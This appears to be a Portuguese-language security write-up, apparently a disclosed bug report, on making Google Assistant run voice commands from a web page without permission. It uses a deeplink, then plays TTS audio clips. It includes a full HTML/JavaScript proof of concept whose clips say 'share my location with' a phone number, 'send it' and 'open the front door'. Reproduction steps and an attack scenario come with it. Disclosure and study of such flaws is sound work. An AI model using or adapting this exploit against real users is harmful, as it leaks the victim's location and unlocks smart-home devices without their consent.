---
layout: single
classes: wide
title:  "Bypass na Autenticação do Google Assistente"
---
## Descrição
Podemos através de uma página web executar comandos no Google Assistente sem nenhuma permissão.
Esse ataque funciona acionando primeiro o Google Assistente usando um deeplink (adquirido na página móvel “google.com”, onde há um botão para acionar o Assistente) e depois de um certo atraso, reproduzindo comandos gerados pelo TTS como áudio simples.

## Passos para reproduzir
Podemos gerar os arquivos de áudio TTS usando a API Google Cloud TTS, e aplicando os comandos de texto nos comentários de JavaScript.
Certifique-se de que o som do dispositivo não esteja desativado ou que os fones de ouvido estejam conectados.
Abra o HTML POC em um dispositivo Android com o Google Assistente e clique em um dos ataques POC.
Após isso veremos o Google Assistente executar comandos automaticamente, sem nenhuma permissão.

Essa vulnerabilidade pode ser explorada da mesma maneira (ou enviando uma intenção “VOICE_COMMAND”) por aplicativos Android (sem nenhuma permissão necessária), na verdade, essa foi a ideia inicial, mas o impacto é muito maior se a vítima só precisar visitar uma página da web para obter os mesmos resultados.

## Observações
Um fato curioso é que ao testar usando o navegador Chrome no Android, um arquivo de áudio é reproduzido de forma diferente dependendo da duração.
Isso nos força a dividir os comandos de ataque em diferentes arquivos de áudio (por exemplo, o "local de compartilhamento" e o número do telefone são comandos diferentes), pois quando tentamos reproduzir o arquivo de áudio mais longo, o Chrome o interpretou como uma "mídia" e exibiu a notificação de controle de mídia também.
E quando acionar o Assistente enquanto uma “mídia” de áudio mais longa estava sendo reproduzida, fez com que o Assistente pausasse o áudio.
Ao usar arquivos de áudio mais curtos, a notificação de controle de mídia não apareceu, e o Assistente não pausou a mídia, permitindo-lhe executar os comandos maliciosos.
 
Utilizando a API Cloud Text-to-Speech para gerar os arquivos de áudio, usamos language_code = ’en-US’ e name = ”en-US-Wavenet-A” para gerar os arquivos de áudio.
Toda a entrada de texto usada para gerar os arquivos de áudio pode ser encontrada nos comentários de JavaScript.
 
Logo abaixo podemos ver um vídeo com a prova de conceito (PoC) para facilitar a visualização do ataque em execução:

Poc: https://youtu.be/T3CgECvV-qM


## Prova de Conceito (PoC)

```
<html>
 
<body>
     
    <h1>
        <a onclick="share()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">
            share location</a>
    </h1>
     
    <h1>
        <a onclick="opendoor()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">open
            front door</a>
    </h1>
 
    <script>
        // language_code='en-US'
        // name="en-US-Wavenet-A"
 
        function share() {
            setTimeout(function() {
 
                var audio = new Audio('share1.mp3'); // "share my location with"
                audio.play();
 
                setTimeout(function() {
 
                    var audio = new Audio('share2.mp3'); // "[redacted]" [PHONE NUMBER TO SEND SMS TO]
                    audio.play();
 
                    setTimeout(function() {
                        var audio = new Audio('confirm.mp3'); // "send it"
                        audio.play();
                    }, 12000);
 
                }, 6000);
 
            }, 500);
        }
 
        function opendoor() {
            setTimeout(function() {
 
                var audio = new Audio('open.mp3'); // "open the front door"
                audio.play();
 
            }, 500);
        }
    </script>
 
</body>
 
</html>

```

## Cénario de Ataque
Este tipo de ataque permite que um invasor execute comandos maliciosos no Google Assistente, em nome da vítima, apenas fazendo a vítima visitar uma página da web.
O Assistente tem acesso a informações extremamente confidenciais e pode ser capaz de controlar a Conta do Google da vítima, o Smart Home e outros dispositivos IOT.
Um invasor nunca deve ser capaz de executar comandos no Google Assistente sem ter permissões suficientes.

## Limitação deste Ataque
* O telefone não deve ser silenciado ou ter fones de ouvido conectados, pois o Google Assistente não ouviria o áudio malicioso.
* Os comandos maliciosos podem ser ouvidos pelo usuário, uma vez que estão tocando em voz alta.
* O ataque irá falhar se o usuário fechar o Assistente no meio do ataque
